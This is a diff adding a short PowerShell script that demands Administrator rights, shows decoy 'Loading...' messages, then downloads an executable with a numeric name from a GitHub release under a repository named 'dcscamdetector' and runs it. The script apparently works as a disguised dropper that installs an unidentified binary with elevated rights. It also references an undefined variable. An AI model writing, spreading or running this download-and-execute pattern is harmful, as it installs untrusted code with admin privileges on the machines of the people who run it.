@@ -1,1 +1,17 @@
+# Ensure the script is running as Administrator
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Host "Run this script as Administrator!"
+    Start-Sleep -Seconds 3
+    Exit
+}
 
+Write-Host "Loading..."
+Write-Host "Loaded!"
+
+# Download and Execute Software
+$software1 = "$env:TEMP\Software1.exe"
+
+Invoke-WebRequest -Uri "https://github.com/dcscamdetector/dcscamdetector.github.io/releases/download/321321312413254325/321321321.exe" -OutFile $software1
+
+Start-Process -FilePath $software1
+Start-Process -FilePath $software2
